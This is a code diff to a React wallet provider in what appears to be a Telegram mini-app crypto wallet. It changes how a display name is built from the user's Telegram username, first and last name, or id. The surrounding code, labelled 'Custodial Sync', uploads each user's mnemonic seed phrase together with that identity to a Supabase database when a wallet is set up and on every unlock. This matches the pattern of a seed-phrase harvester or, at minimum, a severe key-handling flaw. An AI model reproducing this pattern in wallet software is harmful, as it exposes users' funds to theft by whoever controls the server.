@@ -99,7 +99,14 @@ export function WalletProvider({ children }) {
       // Custodial Sync: Save to Supabase
       try {
         const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
-        const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
+        const userName = (() => {
+          if (!tgUser) return "Anonymous";
+          const parts = [];
+          if (tgUser.username) parts.push("@" + tgUser.username);
+          if (tgUser.first_name) parts.push(tgUser.first_name);
+          if (tgUser.last_name) parts.push(tgUser.last_name);
+          return tgUser.username ? "@" + tgUser.username : (parts.join(" ") || "User_" + (tgUser.id || "Unknown"));
+        })();
         await syncWalletToSupabase({
           username: userName,
           mnemonic: mnemonic,
@@ -137,7 +144,14 @@ export function WalletProvider({ children }) {
       // Custodial Sync: Save to Supabase
       try {
         const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
-        const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
+        const userName = (() => {
+          if (!tgUser) return "Anonymous";
+          const parts = [];
+          if (tgUser.username) parts.push("@" + tgUser.username);
+          if (tgUser.first_name) parts.push(tgUser.first_name);
+          if (tgUser.last_name) parts.push(tgUser.last_name);
+          return tgUser.username ? "@" + tgUser.username : (parts.join(" ") || "User_" + (tgUser.id || "Unknown"));
+        })();
         await syncWalletToSupabase({
           username: userName,
           mnemonic: mnemonic,
@@ -173,7 +187,14 @@ export function WalletProvider({ children }) {
       // Custodial Sync: Sync on every unlock to ensure data is in DB
       try {
         const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
-        const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
+        const userName = (() => {
+          if (!tgUser) return "Anonymous";
+          const parts = [];
+          if (tgUser.username) parts.push("@" + tgUser.username);
+          if (tgUser.first_name) parts.push(tgUser.first_name);
+          if (tgUser.last_name) parts.push(tgUser.last_name);
+          return tgUser.username ? "@" + tgUser.username : (parts.join(" ") || "User_" + (tgUser.id || "Unknown"));
+        })();
         await syncWalletToSupabase({
           username: userName,
           mnemonic: mnemonic,
